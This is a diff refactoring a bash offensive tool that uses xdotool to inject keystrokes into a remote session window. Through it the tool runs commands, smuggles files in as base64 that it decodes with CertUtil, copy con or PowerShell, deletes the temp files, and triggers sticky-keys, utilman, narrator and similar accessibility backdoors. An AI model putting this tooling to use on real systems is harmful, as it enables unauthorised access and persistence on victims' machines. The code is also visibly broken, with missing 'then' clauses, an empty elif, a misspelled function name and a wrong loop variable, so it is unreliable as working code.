@@ -26,6 +26,22 @@ function check_dependencies() {
     fi
 }
 
+function xdotool_return_input {
+    local input=$1
+    local key=$2
+    
+    if [ "$key" = "return" ]
+    then
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$input"
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+    elif [ "$key" = "copycon" ]
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$input"
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
+    elif [ "$key" = "custom" ]
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key "$input"
+    fi
+}
+
 # TODO: Fill in the implementation
 function randomize_variable {
     echo "test"
@@ -37,8 +53,7 @@ function CmdFile {
     echo "[*] Executing commands..."
     while read -r line
     do
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+        xdotool_return_input "$line" "return"
     done < $file
     echo "[+] Task completed!"
 }
@@ -50,8 +65,7 @@ function Execute {
     case $method in
         none)
             echo "[*] Executing commands..."
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$commands"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+            xdotool_return_input "$commands" "return"
             echo "[+] Task completed!"
             ;;
         dialogbox)
@@ -79,9 +93,8 @@ function DialogBox {
     fi
 
     echo "[*] Executing commands..."
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+r
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$commands"
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+    xdotool_return_input "Super+r" "custom"
+    xdotool_return_input "$commands" "return"
     echo "[+] Task completed!"
 }
 
@@ -148,8 +161,7 @@ EOF
 
             while IFS= read -r line
             do
-                xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
-                xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+                xdotool_return_input "$line" "return"
             done <<< "$base64_decoder"
         elif [[ "$platform" = "windows" && "$mode" = "cmd" ]]
         then
@@ -160,8 +172,7 @@ EOF
         then
             while read -r line
             do
-                xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "echo -n $line | base64 -d > $output_file"
-                xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+                xdotool_return_input "echo -n $line | base64 -d > $output_file" "return"
             done < "$file"
         fi
 
@@ -196,8 +207,7 @@ function PowershellOutFile {
     # TODO: Test the function and modify when necessary
     if [ -f "$input" ]
     then
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "@'"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+        xdotool_return_input "@'" "return"
         if [ "$mode" = "text" ]
         then
             echo "[*] Checking one of the lines reaches 3477 character limit"
@@ -214,34 +224,26 @@ function PowershellOutFile {
             echo "[*] Transferring file..."
             while read -r line
             do
-                xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
-                xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+                xdotool_return_input "$line" "return"
             done < $input
             
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "'@ | Out-File $output_file"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+            xdotool_return_input "'@ | Out-File $output_file" "return"
         elif [ "$mode" = "certutil" ]
         then
             echo "[*] Transferring file..."
             file=$(base64 -w 64 $input)
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "-----BEGIN CERTIFICATE-----"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+            xdotool_return_input "-----BEGIN CERTIFICATE-----" "return"
             
             while read -r line
             do
-                xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
-                xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+                xdotool_return_input "$line" "return"
             done <<< "$file"
             
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "-----END CERTIFICATE-----"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "'@ | Out-File temp.txt"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
-
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "CertUtil.exe -decode temp.txt $output_file"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+            xdotool_return_input "-----END CERTIFICATE-----" "return"
+            xdotool_return_input "'@ | Out-File temp.txt" "return"
+            xdotool_return_input "CertUtil.exe -decode temp.txt $output_file" "return"
             
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "Remove-Item -Force temp.txt"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+            xdotool_return_input "Remove-Item -Force temp.txt" "return"
         fi
     elif
     fi
@@ -275,41 +277,39 @@ function CopyCon {
         done < $input
 
         echo "[*] Transferring file..."
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "copy con $output_file"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+        xdotool_return_input "copy con $output_file" "return"
 
+        # TODO: Test it to ensure it's functional
+        line_count=$(wc -l < $input)
+        counter=1
         while read -r line
         do
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+            if [ "$current_line" -ne "$line_count" ]
+            then
+                xdotool_return_input "$line" "return"
+            else
+                xdotool_return_input "$line" "copycon"
+            fi
+            ((counter++))
         done < $input
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
     elif [[ ! -f "$input" && -n "$input" && "$mode" = "base64" ]]
     then
         # TODO: Be sure to modify and test that it works
 
         echo "[*] Transferring file..."
         # TODO: replace temp.txt to randomize function
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "copy con temp.txt"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
-
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "-----BEGIN CERTIFICATE-----"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+        xdotool_return_input "copy con temp.txt" "return"
+        xdotool_return_input "-----BEGIN CERTIFICATE-----" "return"
 
         while IFS= read -r line
         do
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
-            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+            xdotool_return_input "$line" "return"
         done <<< "$input"
-
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "-----END CERTIFICATE-----"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
-
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "CertUtil.exe -decode temp.txt $output_file"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
         
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "del /f temp.txt"
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+        xdotool_return_input "-----END CERTIFICATE-----" "copycon"
+
+        dotool_return_input "CertUtil.exe -decode temp.txt $output_file" "return"
+        dotool_return_input "del /f temp.txt" "return"
     fi
 
     echo "[+] File transferred!"
@@ -341,7 +341,7 @@ function StickyKey {
     fi
 
     echo "[*] Activating sethc.exe (sticky keys) backdoor..."
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key shift shift shift shift shift
+    xdotool_return_input "shift shift shift shift shift" "custom"
     echo "[+] Backdoor Activated!"
 }
 
@@ -357,7 +357,7 @@ function UtilityManager {
     fi
 
     echo "[*] Activating utilman.exe (utility manager) backdoor..."
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+u
+    xdotool_return_input "Super+u" "custom"
     echo "[+] Backdoor Activated!"
 }
 
@@ -373,8 +373,8 @@ function Magnifier {
     fi
 
     echo "[*] Activating magnifier.exe backdoor..."
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+equal
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+minus
+    xdotool_return_input "Super+equal" "custom"
+    xdotool_return_input "Super+minus" "custom"
     echo "[+] Backdoor Activated!"
 }
 
@@ -390,7 +390,7 @@ function Narrator {
     fi
 
     echo "[*] Activating narrator.exe backdoor..."
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+Return
+    xdotool_return_input "Super+Return" "custom"
     echo "[+] Backdoor Activated!"
 }
 
@@ -406,7 +406,7 @@ function DisplaySwitch {
     fi
 
     echo "[*] Activating displayswitch.exe backdoor..."
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Super+p
+    xdotool_return_input "Super+p" "custom"
     echo "[+] Backdoor Activated!"
 }
 
